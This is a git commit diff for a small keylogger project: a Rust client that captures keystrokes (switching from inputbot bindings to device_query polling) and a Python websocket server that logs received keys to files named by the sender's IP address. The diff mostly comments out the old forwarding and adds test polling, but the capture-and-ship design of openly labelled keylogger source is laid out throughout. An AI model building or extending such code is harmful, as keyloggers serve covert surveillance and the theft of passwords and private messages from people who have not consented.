b495901dba6de770ab5790b29c94290a23563aa7
aeyis <sungwoo@jopeconnect.com>
2022-05-15 06:28:12 -0400

    maybe switch from inputbot to device query

--- python_ws_server/server.py
+++ python_ws_server/server.py
@@ -4,6 +4,7 @@ import websockets
 
 async def echo(websocket):
     remote_ip = websocket.remote_address[0]
+    print('open')
     # Create File for this address and log out to file
     file = open('logs/' + remote_ip + '_ws.txt', 'a+')
     async for message in websocket:
@@ -11,6 +12,7 @@ async def echo(websocket):
         print("Message: ", message)
         # Currently Writes to file on Client Close and Backwards
         file.write(message)
+        file.close()
 
         # await websocket.send(message)
 
--- src/main.rs
+++ src/main.rs
@@ -4,12 +4,15 @@ use std::io::prelude::*;
 use tungstenite::{connect, Message};
 use url::Url;
 
+use device_query::{DeviceQuery, DeviceState, MouseState, Keycode};
+
 
 const WS_ADDRESS:&str = "ws://localhost:8765";
 
 fn passthrough_key(event: &str) {
-    file_writer(event);
-    ws_client(event);
+    println!("{:?}", event);
+    // file_writer(event);
+    // ws_client(event);
 }
 
 fn file_writer(event: &str) {
@@ -26,50 +29,63 @@ fn file_writer(event: &str) {
 
 fn ws_client(event: &str) {
     // env_logger::init();
-    let (mut socket, response) =
+    let (mut socket, _response) =
     connect(Url::parse(&WS_ADDRESS).unwrap()).expect("Can't connect");
-
     socket.write_message(Message::Text(event.into())).unwrap();
-    loop {
-        let msg = socket.read_message().expect("Error readingasbhello message");
-        println!("Received: {}", msg);
-    }
 }
 
 fn main() {
     println!("Keylogger Running");
-    keyboard_input();
+    // keyboard_input();
+
+
+    let device_state = DeviceState::new();
+    let mouse: MouseState = device_state.get_mouse();
+    println!("Current Mouse Coordinates: {:?}", mouse.coords);
+    let keys: Vec<Keycode> = device_state.get_keys();
+    println!("Is A pressed? {}", keys.contains(&Keycode::A));
+    loop {
+        let keys: Vec<Keycode> = device_state.get_keys();
+        println!("Is A pressed? {}", keys.contains(&Keycode::A));
+    }
+
 }
 
 fn keyboard_input() {
-    EnterKey.bind(|| { passthrough_key("\n") });
-    SpaceKey.bind(|| { passthrough_key(" ") });
-    AKey.bind(|| { passthrough_key("a") });
-    BKey.bind(|| { passthrough_key("b") });
-    CKey.bind(|| { passthrough_key("c") });
-    DKey.bind(|| { passthrough_key("d") });
-    EKey.bind(|| { passthrough_key("e") });
-    FKey.bind(|| { passthrough_key("f") });
-    GKey.bind(|| { passthrough_key("g") });
-    HKey.bind(|| { passthrough_key("h") });
-    IKey.bind(|| { passthrough_key("i") });
-    JKey.bind(|| { passthrough_key("j") });
-    KKey.bind(|| { passthrough_key("k") });
-    LKey.bind(|| { passthrough_key("l") });
-    MKey.bind(|| { passthrough_key("m") });
-    NKey.bind(|| { passthrough_key("n") });
-    OKey.bind(|| { passthrough_key("o") });
-    PKey.bind(|| { passthrough_key("p") });
-    QKey.bind(|| { passthrough_key("q") });
-    RKey.bind(|| { passthrough_key("r") });
-    SKey.bind(|| { passthrough_key("s") });
-    TKey.bind(|| { passthrough_key("t") });
-    UKey.bind(|| { passthrough_key("u") });
-    VKey.bind(|| { passthrough_key("v") });
-    WKey.bind(|| { passthrough_key("w") });
-    XKey.bind(|| { passthrough_key("x") });
-    YKey.bind(|| { passthrough_key("y") });
-    ZKey.bind(|| { passthrough_key("z") });
+    // AKey.bind(|| { passthrough_key("a") });
+    // BKey.bind(|| { passthrough_key("b") });
+    // CKey.bind(|| { passthrough_key("c") });
+    // DKey.bind(|| { passthrough_key("d") });
+    // EKey.bind(|| { passthrough_key("e") });
+    // FKey.bind(|| { passthrough_key("f") });
+    // GKey.bind(|| { passthrough_key("g") });
+    // HKey.bind(|| { passthrough_key("h") });
+    // IKey.bind(|| { passthrough_key("i") });
+    // JKey.bind(|| { passthrough_key("j") });
+    // KKey.bind(|| { passthrough_key("k") });
+    // LKey.bind(|| { passthrough_key("l") });
+    // MKey.bind(|| { passthrough_key("m") });
+    // NKey.bind(|| { passthrough_key("n") });
+    // OKey.bind(|| { passthrough_key("o") });
+    // PKey.bind(|| { passthrough_key("p") });
+    // QKey.bind(|| { passthrough_key("q") });
+    // RKey.bind(|| { passthrough_key("r") });
+    // SKey.bind(|| { passthrough_key("s") });
+    // TKey.bind(|| { passthrough_key("t") });
+    // UKey.bind(|| { passthrough_key("u") });
+    // VKey.bind(|| { passthrough_key("v") });
+    // WKey.bind(|| { passthrough_key("w") });
+    // XKey.bind(|| { passthrough_key("x") });
+    // YKey.bind(|| { passthrough_key("y") });
+    // ZKey.bind(|| { passthrough_key("z") });
 
+    // EnterKey.bind(|| { passthrough_key("\n") });
+    // SpaceKey.bind(|| { passthrough_key(" ") });
+
+    // AKey.bind(|| { println!("a") });
+    let a: i32 = 0x032;
+    let b: u64 = a as u64;
+    OtherKey(b).bind(|| { println!("Z") });
+    OtherKey(0x041).bind(|| { println!("TEST") });
     handle_input_events();
 }
